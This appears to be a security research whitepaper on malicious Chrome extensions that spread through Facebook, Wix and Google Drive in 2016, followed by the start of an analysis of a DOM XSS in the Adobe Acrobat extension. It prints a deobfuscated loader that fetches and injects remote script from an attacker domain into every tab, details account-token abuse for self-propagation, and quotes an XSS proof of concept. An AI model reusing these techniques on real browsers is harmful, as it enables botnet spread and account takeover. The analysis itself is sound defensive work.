Game of Chromes: 
Owning the Web with Zombie Chrome Extensions 
Abstract
2 
Malicious Extensions Analysis
3 
Malicious Extension I  - Bot distribution through Facebook and Wix.com
3 
Malicious Extension II - Bot distribution through Facebook and Google Drive
6 
Vulnerable Extensions Analysis
8 
Vulnerable Extension I   - Adobe Acrobat
8 
Vulnerable Extension II  - AVG Web TuneUp
10 
Vulnerable Extension III - JSONView
14 
Abstract 
On April 16 2016, an army of bots stormed upon Wix servers, creating new accounts and 
publishing shady websites in mass. The attack was carried by a malicious Chrome extension, 
installed on tens of thousands of devices, sending HTTP requests simultaneously. This 
“Extension Bot” has used Wix websites platform and Facebook messaging service, to distribute 
itself among users. Two months later, same attackers strike again. This time they used 
infectious notifications, popping up on Facebook and leading to a malicious Windows-runnable 
JSE file. Upon clicking, the file ran and installed a Chrome extension on the victim’s browser. 
Then the extension used Facebook messaging once again to pass itself on to more victims. 
Analyzing these attacks, we were amazed by the highly elusive nature of these bots, especially 
when it comes to bypassing web-based bot-detection systems. 
This shouldn’t be surprising, since legit browser extensions ​are supposed​ to send Facebook 
messages, create Wix websites, or in fact perform any action on behalf of the user. 
On the other hand, smuggling a malicious extension into Google Web Store and distributing it 
among victims efficiently, like these attackers did, is let’s say - not a stroll in the park. 
But don’t worry, there are other options. 
Recently, several popular Chrome extensions were found to be vulnerable to XSS. ​Yep​, the 
same old XSS every rookie finds in so many web applications. So browser extensions suffer 
from it too, and sadly, in their case it can be much deadlier than in regular websites. 
One noticeable example is the Adobe Acrobat Chrome extension, which was silently installed 
on January 10 by Adobe, on an insane number of ​30 million devices​. A DOM-based XSS 
vulnerability in the extension (found by Google Project Zero) allowed an attacker to craft a 
content that would run JavaScript as the extension. 
In this talk I will show how such a flaw leads to full and permanent control over the victim’s 
browser, turning the extension into zombie. 
Additionally, Shedding more light on the 2016 attacks on Wix and Facebook described in the 
beginning, I will demonstrate how an attacker can use similar techniques to distribute her 
malicious payload efficiently on to new victims, through popular social platforms - creating the 
web’s most powerful botnet ever. 
Malicious Extensions Analysis 
Malicious Extension I  - Bot distribution through Facebook and Wix.com 
This malicious Chrome extension appeared on April 2016. It used Facebook messenger as a 
mean to distribute links to websites created with Wix.com websites platform. These websites 
redirected users to the attacker’s page, persuading the victim’s friends to install the same 
extension. 
The extension’s code was a duplicated version of another extension that was already exist in 
Chrome Web Store (and still exists). The main addition by the attackers to the original extension 
code was in the background script - it loaded a script named “​data.js​” from some path on the 
Internet, and injected it to each and every tab (see extension’s course of action below). This 
script’s code was highly obfuscated, and required us much time and effort to analyze. 
The extension had several versions, it evolved every time we blocked its patterns, or had 
Google removing it from the Web Store. 
The extension permissions included: 
●
http(s)://*/*​ - cross-origin abilities to any address on the Internet. 
●
tabs​ - full control on all chrome tabs, i.e. execute script on a tab, update tab url and 
more. 
●
cookies​ - access to the cookies of any site, including ​http-only​ cookies. 
Once the extension is installed, it performs the following actions: 
1.
As mentioned above, first it sends an ​XHR​ to the attacker’s server, fetches commands 
script “​data.js​” and injects it into all open tabs (using ​tabs.executeScript​). 
2.
Opens a new Facebook tab. “​data.js​” is automatically loaded into it. 
3.
In the Facebook tab,  “​data.js​” appends an invisible iframe into the page’s ​DOM​. The 
frame ​src​ is Wix.com login page. 
4.
Inside the Wix frame (again, “​data.js​” is injected): 
a.
Registers a new user in Wix.com, using randomized username & password 
strings​* ​. 
b.
Creates a new Wix website, and saves it with a crafted payload that redirects 
visitors to the attacker’s website 
c.
Publishes the website on a the Internet (it’s free!). 
5.
Back in the Facebook tab, takes the url of the newly created Wix website, and distributes 
it among all the victim’s friends, using Facebook messages. 
6.
Fetches the victim’s Google authorization token, and uses it to submit a review on 
Chrome Web Store, rating the malicious extension with 5 stars. 
*​ As the attack evolved, the attacker changed the registration method to social login (rather than 
username & password registration), using the victim’s Facebook account. This was done in 
order to avoid bot detection measures that were not enforced for social logins at first (if 
Facebook signed him in, he’s definitely not a bot, right?). 
How it looks from the victim’s perspective: 
1.
I get a message on Facebook from a friend, saying “Enter this link and see who viewed 
your profile on Facebook”, and a link to a Wix website. 
2.
Entering the link, I am redirected to a different page, telling me to install a Chrome 
Extension from the Web Store, in order to see who viewed my profile, of course. 
3.
The link on the attacker’s page does lead to Chrome Web Store. I install the extension 
from the store. 
4.
Nothing happens (code runs on my Facebook tab, creates a new Wix website and sends 
its url to all my friends). 
5.
One of my friends clicks the link, and back to 1, in exponential growth. 
Code Snippets 
Extension manifest.js: 
{ 
    "update_url": "https://clients2.google.com/service/update2/crx", 
    "background": { 
        "scripts": [ 
            "​view.js​" 
        ] 
    }, 
... 
    "description": "Permet de profiter des avantages d'un compte  
viadeo premium", 
... 
    "name": "Viad30 Unlocker", 
    "permissions": [ 
      ​  "tabs", 
        "*://*.viadeo.com/", 
        "storage", 
        "webNavigation", 
        ​"http://*/*", 
        "https://*/*", 
        "cookies", 
        "webRequest", 
        "webRequestBlocking" 
    ], 
    "version": "3.4", 
    "content_security_policy": "script-src 'self' 'unsafe-eval';  
object-src 'self'" 
} 
“view.js”, the background script, downloads “data.js” from the attacker’s server, and injects it into 
all tabs.  
This is a deobfuscated code snippet from “view.js”: 
chrome.​tabs.onUpdated.addListener​(function(gdhndztwu, ylvmbrzaez,  
ypujhmpyy) { 
    var​ ​xhr_obj = ​juykhjkhj​(); 
    xhr_obj['onreadystatechange'] = function() { 
        if​ ​(xhr_obj['readyState'] == 4) { 
            chrome['tabs'][​'executeScript'​]({ 
                code: xhr_obj['responseText'] 
            }) 
        } 
    }; 
    xhr_obj['open']('get', ​'http://appbdajfnec.co/data.js'​);  
    xhr_obj['send'](); 
} 
* The attacker’s domain name presented is not the original domain name used. 
This is actually the attacker’s Command & Control mechanism for his bot extensions. The code 
of “data.js” is injected to any tab, on any update of a page. This way, the attacker is able to send 
tailored-made versions of “data.js”, according to the victim’s properties and the website he’s 
visiting. This grant the attacker with full and dynamic control on his botnet. 
In the presented attack, “data.js” runs all the Wix-site-creating, Facebook-message-sending, 
Google-review-submitting stuff. It’s a 5000 lines script, and it does the whole login step by step. 
Malicious Extension II - Bot distribution through Facebook and Google Drive 
This malicious Chrome extension appeared on June 2016. It gained more than 10,000 
infections within 48 hours, before Facebook / Google blocked it. It was distributed by the same 
attackers acted in the Wix attack two months before (based on mutual techniques, code, 
domains). The distribution method used by this extension resembles the previous one, however 
the attack payload is stored this time in the victim’s Google Drive, rather than in a Wix website. 
This campaign was a great success, and therefore made much noise on the web, as the news 
about “New Facebook Malware” were spread. 
The attack and the malicious extension was covered thoroughly by Kaspersky Labs researcher 
Ido Naor, in his report on Securelist “Tag Me If You Can” . 
1
I will bring here some highlights. 
The attackers this time came up with a real game changer - way of installing the malicious 
extension without having to store it in Chrome Web Store (and being removed by Google once 
it’s reported). They found an original way to run executables on victim’s machines: a ​jse​ file 
that was downloaded straight from a click on a Facebook notification. This ​jse​ file represents a 
JScript code file. Upon clicking, it runs as an executable on any Windows machine. 
The ​jse​ file, once run, creates a copy of the victim’s Chrome process file, with a small addition: 
a malicious extension is installed. 
When Chrome is reopened, the extension performs the following actions: 
1.
Injects the commands script on all tabs (the infamous “data.js”). 
2.
Grabs victim’s Google authorization token, and uses it to upload a new instance of the 
infecting ​jse​ file, to the victim’s Google Drive. 
3.
Changes the permissions of the uploaded file to ​public​, so everyone can access it. 
4.
Uses Facebook API to create tags of all the victim’s Facebook friends. These tags result 
in notifications, shown on the Facebook pages of the tagged users. The notification lead 
to download of the malicious ​jse​ file from Google Drive. 
How can a notification on Facebook lead to a ​jse​ file? Good question. 
Facebook has a plugin system allowing third party websites to implement the Facebook 
commenting system in their pages. We all see it in action every day in many sites that shows 
Facebook comments in the bottom of their pages. 
Tagging a Facebook user in comments run by this plugin, results in a notification on his 
Facebook homepage. The notification, upon clicking, leads the user outside of Facebook - to 
the url where the comments are shown. This url is controlled by the third-party that creates the 
tag using the commenting plugin. 
The attackers leveraged this feature in order to create notifications that lead to ​their​ third-party 
url - a ​jse​ file stored on Google Drive. 
1 ​https://securelist.com/files/2016/07/KL_Facebook_Malware.pdf 
How it looks from the victim’s perspective: 
1.
I get a notification on Facebook, saying a friend I know has just tagged me in a 
comment. I click on the notification. 
2.
I see a Facebook page saying that I’m leaving Facebook, I agree. 
3.
A file is downloaded on my browser. I click the downloaded file, because I’m that 
curious. 
4.
My browser window is suddenly closing and I see a Chrome shortcut on my desktop, I 
click it and the a Facebook tab is opened. 
5.
Nothing happens (code runs on my Facebook tab, uploads a new ​jse​ file to my Google 
Drive, creates tags of all of my friends using the plugin, leading to the ​jse​ file url). 
6.
One of my friends notices I tagged him, 2 clicks and we’re back in 1, in exponential 
growth. 
Vulnerable Extensions Analysis 
Vulnerable Extension I   - Adobe Acrobat  
On January 12th, an automatic Adobe Acrobat update force-installed a Chrome extension 
named Adobe Acrobat, on all Windows machines. The extension purpose was to allow users 
converting web pages into pdf files. A patched version of the extension still exists in Chrome 
Web Store, and currently installed on tens of millions of devices. 
Only 6 days later, while having 30M installations, Google Project Zero researcher Tavis 
Ormandy revealed a DOM-based XSS vulnerability in the extension . 
2
PoC for exploiting the vulnerability was demonstrated by Ormandy in his report: 
window.open("chrome-extension://efaidnbmnnnibpcajpcglclefindmkaj/data
/ 
  js/frame.html?message=" + 
  encodeURIComponent(JSON.stringify({ 
        panel_op: "status", 
        current_status: "failure", 
        message: "hello" 
}))); 
Vulnerability Analysis 
From the exploitation code snippet we learn that an extension page ​frame.html​, which is 
accessible to users by url, lacks input validation on the ​message​ parameter. 
The following code from the extension file frame.js creates the vulnerability: 
... 
} else if (request.current_status === "failure") { 
analytics(events.TREFOIL_HTML_CONVERT_FAILED); 
if (request.message) { 
str_status​ = ​request.message​; 
} 
success = false; 